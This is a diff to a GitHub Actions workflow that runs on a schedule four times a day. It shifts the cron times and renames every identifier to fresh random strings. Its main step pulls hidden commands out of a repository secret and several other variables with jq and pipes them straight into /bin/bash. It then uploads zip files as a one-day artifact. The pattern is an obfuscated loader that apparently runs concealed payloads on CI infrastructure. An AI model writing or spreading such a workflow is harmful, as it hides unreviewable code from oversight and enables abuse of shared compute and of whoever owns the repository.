@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '15 4,10,16,22 * * *'
+    - cron: '40 3,9,15,21 * * *'
 env:
   CI: true
 jobs:
@@ -15,18 +15,19 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          lkq978: ${{ secrets.lkq978 }}
+          hu6052: ${{ secrets.hu6052 }}
         run: |
-          printf '%s' "$lkq978" | jq -r .l9643 | /bin/bash
-          printf '%s' "$c6916" | jq -r .vmchk1200 | /bin/bash
-          echo $vdiuy7097 | jq -r .heek34682 | /bin/bash
-          echo $z484 | jq -r .bnew879 | /bin/bash
-          echo $ghwwc983 | jq -r .vnwan5 | /bin/bash
-          echo $lsp88 | jq -r .jxmjp77 | /bin/bash
+          printf '%s' "$hu6052" | jq -r .qsilz0 | /bin/bash
+          printf '%s' "$k217" | jq -r .gzu656 | /bin/bash
+          echo $pv077 | jq -r .mvc35 | /bin/bash
+          printf '%s' "$nijj38" | jq -r .sq2910 | /bin/bash
+          printf '%s' "$umoka716" | jq -r .iyrws562 | /bin/bash
+          printf '%s' "$kfamx9" | jq -r .kd257 | /bin/bash
+          echo $e94404 | jq -r .e54 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: s7SICsz6
+          name: vcywnW6o
           path: "*.zip"
           retention-days: 1
